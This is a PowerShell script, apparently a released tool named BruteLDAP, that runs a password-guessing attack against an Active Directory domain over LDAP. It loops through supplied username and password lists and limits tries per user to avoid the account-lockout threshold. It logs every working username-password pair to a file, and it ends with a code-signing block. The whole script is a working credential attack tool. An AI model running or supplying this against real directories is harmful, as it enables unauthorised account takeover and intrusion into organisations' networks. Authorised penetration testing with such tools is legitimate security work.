param($U,$P,$L,$C=5)
$logpath = (New-Guid).Guid.replace("-","").substring(0,14) + ".txt"

$banner = @"
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▓                                                                             ▓
▓▓                                                                             ▓
▓▓    ▓▓▓▓    ▓▓▓▓    ▓▓ ▓▓   ▓▓▓▓▓  ▓▓▓▓       ▓▓     ▓▓▓▓    ▓▓▓▓    ▓▓▓▓    ▓
▓▓    ▓▓ ▓▓   ▓▓ ▓▓   ▓▓ ▓▓    ▓▓    ▓▓▓        ▓▓     ▓▓ ▓▓   ▓▓▓▓    ▓▓ ▓    ▓
▓▓    ▓▓▓▓    ▓▓▓▓    ▓▓ ▓▓    ▓▓    ▓▓▓▓       ▓▓     ▓▓ ▓▓   ▓▓▓▓    ▓▓▓▓    ▓
▓▓    ▓▓ ▓▓   ▓▓ ▓▓   ▓▓ ▓▓    ▓▓    ▓▓▓        ▓▓     ▓▓ ▓▓   ▓▓▓▓▓   ▓▓      ▓
▓▓    ▓▓▓▓▓   ▓▓ ▓▓   ▓▓▓▓▓    ▓▓    ▓▓▓▓       ▓▓▓▓   ▓▓▓▓▓  ▓▓▓ ▓▓   ▓▓      ▓
▓▓   ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓    ▓
▓▓                                                                             ▓
▓▓                                                                             ▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓    created@hybase-hu    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   github.com/hybase-hu  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓                         ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▓                                                                             ▓
▓▓                                                                             ▓
▓▓                                                                             ▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓



"@


if (($U -eq $null) -or ($P -eq $null) -or ($L -eq $null)) {
    Write-Host $banner
    Write-Host "#####################################################################`n"
    Write-Host "Usage: BruteLDAP.exe -U 'c:\users\userlist.txt' -P 'c:\users\passlist.txt' -L 'LDAP://domain.local'" -ForegroundColor Yellow
    Write-Host "`n#####################################################################`n"
    write-host "`n[REQUIRED SETTINGS]`n" -ForegroundColor Gray
    Write-Host "-U`tUserlist: username list file"
    Write-Host "-P`tPasswordList: password list file (default max $C probe per user)" 
    Write-Host "-L`tLDAPRootPath: Domain LDAP link ('LDAP://domain.local')"
    write-host "`n[OPTIONAL SETTINGS]`n" -ForegroundColor Gray
    Write-Host "-C Password number probe per user (default is $C)"
    write-host "   Warning, default ActiveDirectory bad password lockout settings is 7"
    Write-Host "--------------------------------------------------------------------"
    Read-Host "I am finish"
    return
}
else {
    write-host $banner
    write-host ""
    Write-Host "#####################################################################"
    write-host "[+]" -ForegroundColor Green -NoNewline
    Write-Host " Show help menu without required parameters"
    Write-Host "[+]" -ForegroundColor Green -NoNewline
    Write-Host " running user-password check with only $C probe"
    Write-Host "#####################################################################"
    Write-Host ""

}



try{
    $UserList = Get-Content -Path $U -ErrorAction Stop 
    $PassWordList = Get-Content -Path $P -ErrorAction Stop
}
catch{
    Write-Host "--------------------------------------------------------------------"
    Write-Host "[-]" -ForegroundColor Red -NoNewline
    Write-Host " "$_.exception.message
    Write-Host "--------------------------------------------------------------------"
    Read-Host "I am finish"
    return
}



function Check-LDAP {
    param($UserName,$UserPassword)


    try{
        $Domain = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList $L.ToUpper(),$UserName,$UserPassword

        $Searcher = New-Object -TypeName System.DirectoryServices.DirectorySearcher
        $Searcher.Filter = "(objectCategory=User)"
        $Searcher.SizeLimit = '1'
        $Searcher.SearchRoot = $Domain
        $Searcher.FindOne() | Out-Null

        Write-Host "[+]" -ForegroundColor Green -NoNewline
        Write-Host " SUCCESS connected $UserName - $UserPassword"
        "[+] $username : $UserPassword" | Out-File $logpath -Append
        $Domain.Close()
    }
    catch {
        Write-Host "[-]" -ForegroundColor DarkRed -NoNewline
        Write-Host " Not connected $UserName - $UserPassword"
        
    }
}




Write-Host $banner
Write-Host "[+] Trying brute force LDAP connectivity $L..." -ForegroundColor Yellow
Write-Host "--------------------------------------------------------------------"
Write-Host ""
foreach ($user in $UserList) {
    for($i = 0; ($i -lt $PassWordList.Length) -and ($i -lt $C) ;$i++) {
        Check-LDAP -UserName $user -UserPassword $PassWordList[$i]
    }

}

Write-Host "--------------------------------------------------------------------"
Read-Host "I am finish"

# SIG # Begin signature block
# MIIFlAYJKoZIhvcNAQcCoIIFhTCCBYECAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUdowZLxeKpWpD3lO0GcGwU8gq
# HQKgggMiMIIDHjCCAgagAwIBAgIQewxi07IMqq5FFU5/SWDdKzANBgkqhkiG9w0B
# AQsFADAnMSUwIwYDVQQDDBxQb3dlclNoZWxsIENvZGUgU2lnbmluZyBDZXJ0MB4X
# DTIyMTAyMTA4MDIxOVoXDTIzMTAyMTA4MjIxOVowJzElMCMGA1UEAwwcUG93ZXJT
# aGVsbCBDb2RlIFNpZ25pbmcgQ2VydDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
# AQoCggEBALFCTAortXYqw8bAfLQBsyaBFh58HuFtmUGPDQkyEubm59W/dhPr2old
# lbYp+uufOwsLvs3ACNLdsJvC58DdWjoKUlshBlymWM2YXNKjfKnRH2s2oObVH8Ls
# YD+QAZZUJei6Hujk3QIja/VjwptHXu8Kss6R5GfjdmxFk5e5NTL55EHqLX6g7oaY
# WXfrj8u5v9xno53/+5ou0r6EayMXNElqA5XYCc/QaNbJvgfYMfrEW4Y8Nq1/ObjB
# d8MmhrLrr4z5Myk6w59CqjCiszXQvEMTO4R8nuTg+c4zHVetY1kvO1M5rkVKy5ZB
# qVZLgWEpt9qpOzr4pN791/NxGFiS4uUCAwEAAaNGMEQwDgYDVR0PAQH/BAQDAgeA
# MBMGA1UdJQQMMAoGCCsGAQUFBwMDMB0GA1UdDgQWBBS71rR7CGZ1ABhX4PFnM9Wp
# 3w4DdjANBgkqhkiG9w0BAQsFAAOCAQEAc4lRJLDfV0VqjHEuk2W3mM56iv6fN4JS
# ND7e1WtTHOYwDOV+/aGfcEQxnjqRmZu6v/TsG+AwSySnuGUm7M+UQF+MTemcQUJJ
# 9Z2rRUaWYDUzr5XXr/+GBOiycZc/HkbiHR1Xlz6+SW6roC+N8rpkS2MLrvo5Hzrp
# uNrwvZjpLUdC6M9Pj4gzTb/FaPWWgflo1gRmyrj7z9SE1e69yd1Q9ZaNSFMJoOxw
# BzDfjaxVE8gRjkR2yea4are8byG3NZhQTobcGjKb8hd++dlAGVZD54PCvUXNKkXZ
# kVXqwBI7YYTSsEzayqWCQQGo+9A3rOsSpw3h3QzUazj7ySIHL5E2YTGCAdwwggHY
# AgEBMDswJzElMCMGA1UEAwwcUG93ZXJTaGVsbCBDb2RlIFNpZ25pbmcgQ2VydAIQ
# ewxi07IMqq5FFU5/SWDdKzAJBgUrDgMCGgUAoHgwGAYKKwYBBAGCNwIBDDEKMAig
# AoAAoQKAADAZBgkqhkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgEL
# MQ4wDAYKKwYBBAGCNwIBFTAjBgkqhkiG9w0BCQQxFgQU0kioAgHnQbAyEXpYp6Rv
# 659LIaMwDQYJKoZIhvcNAQEBBQAEggEAJJwDPV9oCyHgzE7MTBuqqoXizSdq8lmG
# TmzqDmTm8Wpmd/2Bxh150yqZ0s5HwhJts5zW07hHoy1WrJ5INUWHBzzZj9VCFbNG
# Ax6Ea/tooqqrDcmX2V22DXMe41cIqHr06Lbde3HfQAG4ZWkRWTXhAEpjD0K7Yn6R
# WzTiifY5ZUA0hFnEqXDl51+29RZvHw5NkpuVnL6R5zlsmoxmovLHaa45v3izvlvJ
# r8c6oJQFTa/kcyJi/r7+DJllPxGhSEFu8+LX7QsZwt52FnEAzKfnz+oR91AVS9qh
# /ic3NlLQmp4F96ZspBlSu6XNRjUlc8+67hF9c14wcuyZEAURhALduQ==
# SIG # End signature block
